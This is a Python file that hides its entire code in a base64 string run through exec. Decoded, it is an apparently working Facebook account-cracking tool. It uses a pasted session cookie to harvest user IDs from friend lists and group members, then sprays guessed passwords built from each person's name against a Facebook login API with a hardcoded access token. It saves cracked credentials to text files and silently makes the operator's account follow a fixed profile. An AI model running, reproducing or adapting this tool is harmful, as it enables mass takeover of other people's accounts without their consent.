import base64
exec(base64.b64decode('IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMw0KIyAtKi0gY29kaW5nOiB1dGYtOCAtKi0NCg0KaW1wb3J0IG9zDQppbXBvcnQgcmUgDQppbXBvcnQgdGltZQ0KaW1wb3J0IGpzb24NCmltcG9ydCByYW5kb20NCmltcG9ydCByZXF1ZXN0cw0KZnJvbSBzYXlhbmcgaW1wb3J0IGxvZ28NCmZyb20gYnM0IGltcG9ydCBCZWF1dGlmdWxTb3VwIGFzIHBhcnNlcg0KZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvcg0KbWJhc2ljID0gJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbXt9Jw0KZ2xvYmFsIGRpZSxjaGVjayxyZXN1bHQsIGNvdW50DQoNCmlkID0gW10NCmRpZSA9IDANCmNoZWsgPSBbXQ0Kc3VjY2VzID0gW10NCmNvdW50ID0gMA0KY2hlY2sgPSAwDQpyZXN1bHQgPSAwDQoNCmcgPSAnXHgxYlsxOzMybScNCncgPSAnXHgxYlsxOzM3bScNCmIgPSAnXHgxYlsxOzM2bScNCnIgPSAnXHgxYlsxOzMxbScNCg0KZGVmIG1hc3VrKCk6DQogICAgICAgIGxvZ28uYmFubmVyMSgpDQogICAgICAgIHByaW50KCdcblxuXHRcdOKLmPCShpwgXDAzM1sxOzM0bUxPR0lOIEZBQ0VCT09LIEFOREFcMDMzWzBtIPCShpzii5lcblxuJykNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIGNlayA9IG9wZW4oImNvb2tpZXMiKS5yZWFkKCkNCiAgICAgICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOg0KICAgICAgICAgICAgICAgIGNlayA9IGlucHV0KCJcMDMzWzE7OTNtTE9HSU4gRlJPTSBDT09LSUVcMDMzWzBtID4+Pj4gIikNCiAgICAgICAgY2VrID0geyJjb29raWUiOmNla30NCiAgICAgICAgaXNtaSA9IHNlcy5nZXQobWJhc2ljLmZvcm1hdCgiL21lIix2ZXJpZnk9RmFsc2UpLGNvb2tpZXM9Y2VrKS5jb250ZW50DQogICAgICAgIGlmICJtYmFzaWNfbG9nb3V0X2J1dHRvbiIgaW4gc3RyKGlzbWkpOg0KICAgICAgICAgICAgICAgIGlmICJBcGEgeWFuZyBBbmRhIHBpa2lya2FuIHNla2FyYW5nIiBpbiBzdHIoaXNtaSk6DQogICAgICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4oImNvb2tpZXMiLCJ3IikgYXMgZjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZi53cml0ZShjZWtbImNvb2tpZSJdKQ0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiIyBDaGFuZ2UgdGhlIGxhbmd1YWdlLCBwbGVhc2Ugd2FpdCEhIikNCiAgICAgICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVxdWVzdHMuZ2V0KG1iYXNpYy5mb3JtYXQocGFyc2VyKGlzbWksImh0bWwucGFyc2VyIikuZmluZCgiYSIsc3RyaW5nPSJCYWhhc2EgSW5kb25lc2lhIilbImhyZWYiXSksY29va2llcz1jZWspDQogICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MNCiAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAjIHBsZWFzZSBkb24ndCByZW1vdmUgdGhpcyBvciBjaGFuZ2UNCiAgICAgICAgICAgICAgICAgICAgICAgIGlrdXRpID0gcGFyc2VyKHJlcXVlc3RzLmdldChtYmFzaWMuZm9ybWF0KCIvZG9ndWthbi5lci4xNDQiKSxjb29raWVzPWNlaykuY29udGVudCwiaHRtbC5wYXJzZXIiKS5maW5kKCJhIixzdHJpbmc9IklrdXRpIilbImhyZWYiXQ0KICAgICAgICAgICAgICAgICAgICAgICAgc2VzLmdldChtYmFzaWMuZm9ybWF0KGlrdXRpKSxjb29raWVzPWNlaykNCiAgICAgICAgICAgICAgICBleGNlcHQgOg0KICAgICAgICAgICAgICAgICAgICAgICAgcGFzcyANCiAgICAgICAgICAgICAgICByZXR1cm4gY2VrWyJjb29raWUiXQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICBleGl0KCIjIGNvb2tpZXMgaW52YWxpZCIpDQpkZWYgbG9naW4odXNlcm5hbWUscGFzc3dvcmQsY2VrPUZhbHNlKToNCiAgICAgICAgZ2xvYmFsIGRpZSxjaGVjayxyZXN1bHQsY291bnQNCiAgICAgICAgYiA9ICIzNTA2ODU1MzE3MjglN0M2MmY4Y2U5Zjc0YjEyZjg0YzEyM2NjMjM0MzdhNGEzMiINCiAgICAgICAgcGFyYW1zID0gew0KICAgICAgICAgICAgICAgICdhY2Nlc3NfdG9rZW4nOiBiLA0KICAgICAgICAgICAgICAgICdmb3JtYXQnOiAnSlNPTicsDQogICAgICAgICAgICAgICAgJ3Nka192ZXJzaW9uJzogJzInLA0KICAgICAgICAgICAgICAgICdlbWFpbCc6IHVzZXJuYW1lLA0KICAgICAgICAgICAgICAgICdsb2NhbGUnOiAnZW5fVVMnLA0KICAgICAgICAgICAgICAgICdwYXNzd29yZCc6IHBhc3N3b3JkLA0KICAgICAgICAgICAgICAgICdzZGsnOiAnaW9zJywNCiAgICAgICAgICAgICAgICAnZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzJzogJzEnLA0KICAgICAgICAgICAgICAgICdzaWcnOiAnM2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYnLA0KICAgICAgICB9DQogICAgICAgIGFwaSA9ICdodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbicNCiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQoYXBpLCBwYXJhbXM9cGFyYW1zKQ0KICAgICAgICBpZiAnRUFBJyBpbiByZXNwb25zZS50ZXh0Og0KICAgICAgICAgICAgICAgIHByaW50KGYiXHJbXDAzM1sxOzMxbVNVQ0NFU1wwMzNbMG1dIHt1c2VybmFtZX0gPT4ge3Bhc3N3b3JkfSAgICAgICAgICAgICAgICAgICAgICAgIixlbmQ9IiIpDQogICAgICAgICAgICAgICAgcHJpbnQoKQ0KICAgICAgICAgICAgICAgIHJlc3VsdCArPSAxDQogICAgICAgICAgICAgICAgaWYgY2VrOg0KICAgICAgICAgICAgICAgICAgICAgICAgc3VjY2VzLmFwcGVuZCh1c2VybmFtZSsifCIrcGFzc3dvcmQpDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbigncmVzdWx0cy1zdWNjZXMudHh0JywnYScpIGFzIGY6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYud3JpdGUodXNlcm5hbWUgKyAnfCcgKyBwYXNzd29yZCArICdcbicpDQogICAgICAgIGVsaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHJlc3BvbnNlLmpzb24oKVsnZXJyb3JfbXNnJ106DQogICAgICAgICAgICAgICAgcHJpbnQoZiJccltcMDMzWzE7OTNtQ0hFS1wwMzNbMG1dIHt1c2VybmFtZX0gPT4ge3Bhc3N3b3JkfSAgICAgICAgICAgICAgICAgICAgIixlbmQ9IiIpDQogICAgICAgICAgICAgICAgcHJpbnQoKQ0KICAgICAgICAgICAgICAgIGNoZWNrICs9IDENCiAgICAgICAgICAgICAgICBpZiBjZWs6DQogICAgICAgICAgICAgICAgICAgICAgICBjaGVrLmFwcGVuZCh1c2VybmFtZSsifCIrcGFzc3dvcmQpDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbigncmVzdWx0cy1jaGVjay50eHQnLCdhJykgYXMgZjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZi53cml0ZSh1c2VybmFtZSArICd8JyArIHBhc3N3b3JkICsgJ1xuJykNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBkaWUgKz0gMQ0KICAgICAgICBmb3IgaSBpbiBsaXN0KCdcfC8t4oCiJyk6DQogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIlxyW3tpfV0gXDAzM1sxOzkzbVN1Y2Nlc1wwMzNbMG0gOiAoe3N0cihyZXN1bHQpfSkgXDAzM1sxOzkzbWNoZWNrcG9pbnRcMDMzWzBtIDogKHtzdHIoY2hlY2spfSkgXDAzM1sxOzkzbWRpZVwwMzNbMG0gOiAoe3N0cihkaWUpfSkiLGVuZD0iIikNCiAgICAgICAgICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4yKQ0KZGVmIGdldGlkKHVybCk6DQogICAgICAgIHJhdyA9IHJlcXVlc3RzLmdldCh1cmwsY29va2llcz1rdWtpKS5jb250ZW50DQogICAgICAgIGdldHVzZXIgPSByZS5maW5kYWxsKCdtaWRkbGUiPjxhIGNsYXNzPSIuLiIgaHJlZj0iKC4qPykiPiguKj8pPC9hPicsc3RyKHJhdykpDQogICAgICAgIGZvciB4IGluIGdldHVzZXI6DQogICAgICAgICAgICAgICAgaWYgJ3Byb2ZpbGUnIGluIHhbMF06DQogICAgICAgICAgICAgICAgICAgICAgICBpZC5hcHBlbmQoeFsxXSArICd8JyArIHJlLmZpbmRhbGwoIj0oXGQqKT8iLHN0cih4WzBdKSlbMF0pDQogICAgICAgICAgICAgICAgZWxpZiAnZnJpZW5kcycgaW4geDoNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgIGlkLmFwcGVuZCh4WzFdICsgJ3wnICsgeFswXS5zcGxpdCgnLycpWzFdLnNwbGl0KCc/JylbMF0pDQogICAgICAgICAgICAgICAgcHJpbnQoJ1xyIyAnICsgc3RyKGxlbihpZCkpICsgIiByZXRyaWV2ZWQiLGVuZD0iIikNCiAgICAgICAgaWYgJ0xpaGF0IFRlbWFuIExhaW4nIGluIHN0cihyYXcpOg0KICAgICAgICAgICAgICAgIGdldGlkKG1iYXNpYy5mb3JtYXQocGFyc2VyKHJhdywnaHRtbC5wYXJzZXInKS5maW5kKCdhJyxzdHJpbmc9J0xpaGF0IFRlbWFuIExhaW4nKVsnaHJlZiddKSkNCiAgICAgICAgcmV0dXJuIGlkDQpkZWYgZ3J1YmlkKGVuZHBvaW50KToNCiAgICAgICAgZ3JhYiA9IHJlcXVlc3RzLmdldChlbmRwb2ludCxjb29raWVzPWt1a2kpLmNvbnRlbnQNCiAgICAgICAgdXNlcnMgPSByZS5maW5kYWxsKCdhIGNsYXNzPSIuLiIgaHJlZj0iLyguKj8pIj4oLio/KTwvYT4nLHN0cihncmFiKSkNCiAgICAgICAgZm9yIHVzZXIgaW4gdXNlcnM6DQogICAgICAgICAgICAgICAgaWYgInByb2ZpbGUiIGluIHVzZXJbMF06DQogICAgICAgICAgICAgICAgICAgICAgICBpZC5hcHBlbmQodXNlclsxXSArICJ8IiArIHJlLmZpbmRhbGwoJ2lkPShcZCopJyxzdHIodXNlclswXSkpWzBdKQ0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICBpZC5hcHBlbmQodXNlclsxXSArICJ8IiArIHVzZXJbMF0pDQogICAgICAgICAgICAgICAgcHJpbnQoZiJcciMge3N0cihsZW4oaWQpKX0gcmV0cmlldmVkICIsZW5kPSIiKQ0KICAgICAgICBpZiAiTGloYXQgU2VsZW5na2FwbnlhIiBpbiBzdHIoZ3JhYik6DQogICAgICAgICAgICAgICAgZ3J1YmlkKG1iYXNpYy5mb3JtYXQocGFyc2VyKGdyYWIsImh0bWwucGFyc2VyIikuZmluZCgiYSIsc3RyaW5nPSJMaWhhdCBTZWxlbmdrYXBueWEiKVsiaHJlZiJdKSkNCiAgICAgICAgcmV0dXJuIGlkDQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgb3Muc3lzdGVtKCJnaXQgcHVsbCIpDQogICAgICAgICAgICAgICAgc2VzID0gcmVxdWVzdHMuU2Vzc2lvbigpDQogICAgICAgICAgICAgICAga3VraXMgPSBtYXN1aygpDQogICAgICAgICAgICAgICAga3VraSA9IHsnY29va2llJzprdWtpc30NCiAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oImNsZWFyIikNCiAgICAgICAgICAgICAgICBsb2dvLmJhbm5lcjEoKQ0KICAgICAgICAgICAgICAgIHByaW50KCdcblxuXHRcdOKLmPCShpwgXDAzM1sxOzkzbUZBQ0VCT09LIFRPT0xTXDAzM1swbSDwkoac4ouZXG5cbicpDQogICAgICAgICAgICAgICAgcHJpbnQoJ1wwMzNbMTs5MW3wn5GJIFwwMzNbMG1bXDAzM1sxOzMybTFcMDMzWzBtXSBcMDMzWzE7OTNtTElTVCBGUklFTkRTXDAzM1swbScpDQogICAgICAgICAgICAgICAgcHJpbnQoJ1wwMzNbMTs5MW3wn5GJIFwwMzNbMG1bXDAzM1sxOzMybTJcMDMzWzBtXSBcMDMzWzE7OTNtQ1JBQ0sgRlJPTSBHUk9VUFwwMzNbMG0gJykNCiAgICAgICAgICAgICAgICBwcmludCgnXDAzM1sxOzkxbfCfkYkgXDAzM1swbVtcMDMzWzE7MzJtM1wwMzNbMG1dIFwwMzNbMTs5M21DUkFDSyBGUk9NIEZSSUVORFNcMDMzWzBtJykNCiAgICAgICAgICAgICAgICBwcmludCgnXDAzM1sxOzkxbfCfkYkgXDAzM1swbVtcMDMzWzE7MzJtNFwwMzNbMG1dIFwwMzNbMTs5M21SRVNVTFRTIENIRUNLU1wwMzNbMG0nKQ0KICAgICAgICAgICAgICAgIHByaW50KCdcMDMzWzE7OTFtXDAzM1swbVxuJykNCiAgICAgICAgICAgICAgICBwcmludCgpDQogICAgICAgICAgICAgICAgdGFueWEgPSBpbnB1dCgn8J+RiSAnKQ0KICAgICAgICAgICAgICAgIGlmIHRhbnlhID09IiI6DQogICAgICAgICAgICAgICAgICAgICAgICBleGl0KCJbIV0gRG9udCBiZSBlbXB0eSIpDQogICAgICAgICAgICAgICAgZWxpZiB0YW55YSA9PSAnMSc6DQogICAgICAgICAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oImNsZWFyIikNCiAgICAgICAgICAgICAgICAgICAgICAgIGxvZ28uYmFubmVyMigpDQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgpDQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgpDQogICAgICAgICAgICAgICAgICAgICAgICB1cmwgPSBwYXJzZXIoc2VzLmdldChtYmFzaWMuZm9ybWF0KCcvbWUnKSxjb29raWVzPWt1a2kpLmNvbnRlbnQsJ2h0bWwucGFyc2VyJykuZmluZCgnYScsc3RyaW5nPSdUZW1hbicpDQogICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IGdldGlkKG1iYXNpYy5mb3JtYXQodXJsWyJocmVmIl0pKQ0KICAgICAgICAgICAgICAgIGVsaWYgdGFueWEgPT0gJzInOg0KICAgICAgICAgICAgICAgICAgICAgICAgb3Muc3lzdGVtKCJjbGVhciIpDQogICAgICAgICAgICAgICAgICAgICAgICBsb2dvLmJhbm5lcjIoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTs5M21DVU1BIDEwMCBJRCBTQUpBXDAzM1swbSAiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZ3JhYiA9IGlucHV0KCJcMDMzWzE7OTNtSUQgR1JPVVBcMDMzWzBtID4+PiAiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgdXNlcm5hbWUgPSBncnViaWQobWJhc2ljLmZvcm1hdCgiL2Jyb3dzZS9ncm91cC9tZW1iZXJzLz9pZD0iICsgZ3JhYikpDQogICAgICAgICAgICAgICAgICAgICAgICBpZiBsZW4odXNlcm5hbWUpID09IDA6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4aXQoIiMgSUQgd3JvbmciKQ0KICAgICAgICAgICAgICAgIGVsaWYgdGFueWEgPT0gJzMnOg0KICAgICAgICAgICAgICAgICAgICAgICAgb3Muc3lzdGVtKCJjbGVhciIpDQogICAgICAgICAgICAgICAgICAgICAgICBsb2dvLmJhbm5lcjIoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgemV0ID0gaW5wdXQoIlwwMzNbMTs5M21VU0VSTkFNRS9JRFwwMzNbMG0gPj4+ICIpDQogICAgICAgICAgICAgICAgICAgICAgICBpZiB6ZXQuaXNkaWdpdCgpOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VyID0gIi9wcm9maWxlLnBocD9pZD0iICsgemV0DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VyID0gIi8iICsgemV0DQogICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXIgPSBwYXJzZXIocmVxdWVzdHMuZ2V0KG1iYXNpYy5mb3JtYXQodXNlciksY29va2llcz1rdWtpKS5jb250ZW50LCJodG1sLnBhcnNlciIpLmZpbmQoJ2EnLHN0cmluZz0iVGVtYW4iKVsiaHJlZiJdDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJuYW1lID0gZ2V0aWQobWJhc2ljLmZvcm1hdCh1c2VyKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBUeXBlRXJyb3I6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4aXQoIiMgdXNlciBub3QgZm91bmQgIikNCiAgICAgICAgICAgICAgICBlbGlmIHRhbnlhID09ICc0JzoNCiAgICAgICAgICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgiY2xlYXIiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgbG9nby5iYW5uZXIyKCkNCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCkNCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCkNCiAgICAgICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZTEgPSBvcGVuKCJyZXN1bHRzLWNoZWNrLnR4dCIpLnJlYWQoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlMiA9IG9wZW4oInJlc3VsdHMtc3VjY2VzLnR4dCIpLnJlYWQoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhID0gZmlsZTEgKyBmaWxlMg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaW5hbCA9IGEuc3RyaXAoKS5zcGxpdCgiXG4iKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaW5hbCA9IHNldChmaW5hbCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiIjIHtzdHIobGVuKGZpbmFsKSl9IGFjY291bnRzIHRvIGNoZWNrICIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPTEwKSBhcyBleDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgdXNlciBpbiBmaW5hbDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGEgPSB1c2VyLnNwbGl0KCJ8IikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4LnN1Ym1pdChsb2dpbiwoYVswXSksKGFbMV0pLChUcnVlKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3MucmVtb3ZlKCJyZXN1bHRzLWNoZWNrLnR4dCIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLnJlbW92ZSgicmVzdWx0cy1zdWNjZXMudHh0IikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHggaW4gc3VjY2VzOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbigncmVzdWx0cy1zdWNjZXMudHh0JywnYScpIGFzIGY6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmLndyaXRlKHgrJ1xuJykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHggaW4gY2hlazoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4oJ3Jlc3VsdHMtY2hlY2sudHh0JywnYScpIGFzIGY6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmLndyaXRlKHgrIlxuIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJcbiMgRG9uZSIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCIjIHNhdmVkIHRvIHJlc3VsdHMtY2hlY2sudHh0IHJlc3VsdHMtc3VjY2VzLnR4dCIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4aXQoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0KCIjIHlvdSBub3QgaGF2ZSBhIHJlc3VsdHMiKQ0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICBleGl0KCIjIHdyb25nIGNob2ljZSIpDQogICAgICAgICAgICAgICAgcHJpbnQoKQ0KICAgICAgICAgICAgICAgIGV4cGFzcyA9IGlucHV0KCJcMDMzWzE7MzJtRVhUUkEgUEFTU1dPUkRcMDMzWzBtID4+PiAiKQ0KICAgICAgICAgICAgICAgIHByaW50KCJcMDMzWzE7MzRtcmVzdWx0IHdpbGwgYmUgc2F2ZWQgaW4gcmVzdWx0cy1zdWNjZXMudHh0IGFuZCByZXN1bHRzLWNoZWNrLnR4dFwwMzNbMG0gIikNCiAgICAgICAgICAgICAgICB3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0zMCkgYXMgZXg6DQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgdXNlciBpbiB1c2VybmFtZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNlcnMgPSB1c2VyLnNwbGl0KCd8JykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3MgPSB1c2Vyc1swXS5zcGxpdCgnICcpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB4IGluIHNzOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpc3RwYXNzID0gWw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyKHgpICsgJzEyMycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHIoeCkgKyAnNzg2JywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cih4KSArICcxMjM0NScsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHIoeCkgKyAnQDEyMycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHIoeCkgKyAnMTInLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyKHgpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlzdHBhc3MuYXBwZW5kKGV4cGFzcykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgcGFzc3cgaW4gc2V0KGxpc3RwYXNzKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4LnN1Ym1pdChsb2dpbiwodXNlcnNbMV0pLChwYXNzdykpDQogICAgICAgICAgICAgICAgaWYgY2hlY2sgIT0gMCBvciByZXN1bHQgIT0gMDoNCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJcbltcMDMzWzE7MzJt4pyUXDAzM1swbV0gXDAzM1sxOzM0bURvbmUuIGZpbGUgc2F2ZWQgaW5cMDMzWzBtIDogIikNCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCIgICAgICAgIC0gXDAzM1sxOzMxbXN1Y2Nlc1wwMzNbMG0gOiBcMDMzWzE7MzZtcmVzdWx0cy1zdWNjZXMudHh0XDAzM1swbSIpDQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiICAgICAgICAtIFwwMzNbMTszMW1jaGVja3BvaW50XDAzM1swbSA6IFwwMzNbMTszNm1yZXN1bHRzLWNoZWNrLnR4dFwwMzNbMG0iKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgiXDAzM1sxOzM0bSMgdGhhbmtzIGZvciB1c2luZyB0aGlzIHRvb2xzXDAzM1swbSIpDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJcbiMgRG9uZSIpDQogICAgICAgICAgICAgICAgICAgICAgICBleGl0KCIjIG5vIHJlc3VsdCIpDQogICAgICAgIGV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsRU9GRXJyb3IpOg0KICAgICAgICAgICAgICAgIGV4aXQoKQ0KICAgICAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQogICAgICAgICAgICAgICAgZXhpdCgiIyBDb25uZWN0aW9uIGVycm9yIikNCg==')
